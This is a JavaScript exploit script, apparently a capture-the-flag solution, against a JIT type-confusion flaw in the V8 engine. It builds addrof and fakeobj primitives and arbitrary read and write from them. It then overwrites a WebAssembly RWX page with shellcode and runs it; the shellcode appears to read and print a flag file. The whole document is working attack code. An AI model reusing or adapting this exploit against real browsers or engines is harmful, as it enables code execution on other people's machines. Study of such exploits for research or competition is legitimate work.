function oobRead() {
  //addrOf b[0] and addrOf writeArr::elements
  return [x[0]];
}

function oobWrite(addr) {
  x[0] = addr;
}

var arr0 = new Array(10); arr0.fill(1.1);arr0.a = 1;
var arr1 = new Array(10); arr1.fill(2.2);arr1.a = 1;

var x = arr0;
x = arr1;


var writeArr = [1.1];

for (let i = 0; i < 20000; i++) {
  oobRead();
}

for (let i = 0; i < 20000; i++) oobWrite(1.1);

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) == float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) == BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// debugging function to display float values as hex
function toHex(val) {
        return "0x" + val.toString(16);
}

var f_map = 0x082c3ae1n
var f_map = 0x8203af9n

function addrof(obj) {
  x = [obj, 1.1, 2.2, 3.3]
  return ftoi(oobRead()[0])&0xffffffffn;
}

function fakeobj(addr) {
  oobWrite(itof(addr))
  console.log('[+] fakeobj',typeof(x[0]))
  return x[0]
}

function arb_read(addr)
{
    console.log("[+] Making arb_rw_arr")
    var arb_rw_arr = [itof(f_map), 1.2, itof(0x08295e8d08005e29n), itof(0x0000000808002a99n)];
    console.log("[+] Creating fake obj 0x"+addrof(arb_rw_arr).toString(16))
    var fake = fakeobj(BigInt(addrof(arb_rw_arr)) - 0x20n);
    console.log("[+] Changing map")
    arb_rw_arr[1] = itof(BigInt("0x800000000")+BigInt(toHex(addr)) - 0x8n);
    console.log("[+] Leak")
    return ftoi(fake[0]);
}

function arb_write(addr, val)
{
    var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
    var fake = fakeobj(BigInt(addrof(arb_rw_arr)) - 0x20n);
    arb_rw_arr[1] = itof(BigInt("0x800000000")+BigInt(toHex(addr)) - 0x8n);
    fake[0] = itof(BigInt(val));
    return;
}

function copyshellcode(addr, shellcode)
{
    addr = BigInt(addr)
    buf = new ArrayBuffer(0x100);
    dataview = new DataView(buf);
    buf_addr = addrof(buf);
    console.log('[+] buf addr',toHex(buf_addr));
    // %DebugPrint(buf)
    backing_store_addr = BigInt(buf_addr) + 0x1cn;
    console.log('[+] buf backing store',toHex(backing_store_addr));
    console.log('[+] backing store val', toHex(arb_read(backing_store_addr)))
    console.log('[+] new addr', toHex(addr))
    fake = arb_write(backing_store_addr, BigInt(addr));
    console.log('[+] copying shellcode')
    for (let i = 0; i < shellcode.length; i++) {
      dataview.setUint32(4*i, shellcode[i], true);
    }
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;
leaker = addrof(wasm_instance)
console.log("[+] Leaker: 0x" + leaker.toString(16));
// %DebugPrint(wasm_instance)
rwx_page = arb_read(BigInt(leaker)+0x60n)
console.log("[+] Rwx_page: 0x" + rwx_page.toString(16))
shellcode = [106, 116, 72, 184, 47, 102, 108, 97, 103, 46, 116, 120, 80, 72, 137, 231, 49, 210, 49, 246, 106, 2, 88, 15, 5, 72, 137, 199, 49, 192, 49, 210, 178, 128, 72, 137, 230, 15, 5, 106, 1, 95, 49, 210, 178, 128, 72, 137, 230, 106, 1, 88, 15, 5]
kshellcode = []
for(let i=0; i<shellcode.length; i+=4){
  kshellcode.push(shellcode[i]+(shellcode[i+1]<<8)+(shellcode[i+2]<<16)+(shellcode[i+3]<<24))
}
copyshellcode("0x" + rwx_page.toString(16), kshellcode)
console.log('[+] running shellcode')
pwn()
